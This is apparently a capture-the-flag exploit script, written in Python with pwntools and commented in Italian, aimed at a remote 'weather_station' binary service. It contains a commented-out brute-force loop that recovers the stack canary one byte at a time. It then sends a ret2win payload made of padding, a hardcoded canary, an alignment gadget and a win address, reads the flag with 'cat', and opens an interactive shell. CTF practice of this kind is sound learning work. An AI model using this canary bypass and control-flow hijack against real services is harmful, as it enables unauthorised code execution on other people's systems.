#!/usr/bin/env python3
from pwn import *
import time

#HOST, PORT = '127.0.0.1', 5555
HOST, PORT = 'offsec.m0lecon.it', 13530
#canary for this instance: 0x7637696b0f18b300
#context.binary = elf = ELF('./weather_station', checksec=False)

#p = process(elf.path)

# Your exploit here

OFFSET_TO_CANARY = 56
OFFSET_TO_RIP = 72
win_addr = 0x401530
ret_addr = 0x40101a

context.log_level = 'info'

def get_conn():
    return remote(HOST, PORT, level='error')

# --- FASE 1: BRUTE-FORCE DEL CANARY ---
known_canary = b"\x00" # Il primo byte del canary è sempre nullo (0x00)

log.info("Inizio brute-force del Canary...")
'''
for i in range(7):
    for bval in range(256):
        io = remote(HOST, PORT, level='error')
        try:
            # 1. Superiamo il primo prompt (location)
            io.recvuntil(b"location: ")
            io.send(b"A" * 16) # Riempire il buffer 'location' senza romperlo
            
            # 2. Arriviamo al prompt della query (dove c'è l'overflow)
            io.recvuntil(b"query: ")
            
            # Costruiamo il tentativo: padding + quello che sappiamo + il byte da testare
            guess = known_canary + bytes([bval])
            payload = b"A" * OFFSET_TO_CANARY + guess
            
            io.send(payload)
            
            # Se il canary è corretto, il processo non crasha e risponde
            # Se è sbagliato, il figlio muore e riceviamo EOF
            if b"Forecast sent!" in io.recvline(timeout=0.3):
                known_canary = guess
                log.success(f"byte {i+1}: {bval:02x}")
                io.close()
                break
            
            io.close()
        except EOFError:
            io.close()
            continue
'''
#canary_int = u64(known_canary.ljust(8, b"\x00"))
#canary = u64(known_canary)
canary = 0x7637696b0f18b300
log.info(f"Canary: {canary}")

# --- FASE 2: EXPLOIT FINALE ---

io = remote(HOST, PORT)
io.recvuntil(b"location: ")
io.sendline(b"AAAA")

io.recvuntil(b"query: ")

# Costruzione del payload ROP
# Offset 56: Canary
# Offset 64: Saved RBP (8 byte di spazzatura)
# Offset 72: RIP
payload = flat(
    b"A" * OFFSET_TO_CANARY,
    #canary_int,
    p64(canary),
    b"B" * 8,          # Padding per sovrascrivere RBP
    p64(ret_addr),          # Gadget per allineamento stack
    p64(win_addr)           # Funzione win()
)

print(payload)
io.send(payload)

sleep(0.5)
io.sendline('cat /home/user/flag')
# Se l'exploit funziona, dovremmo avere la shell
io.interactive()
#p.interactive()
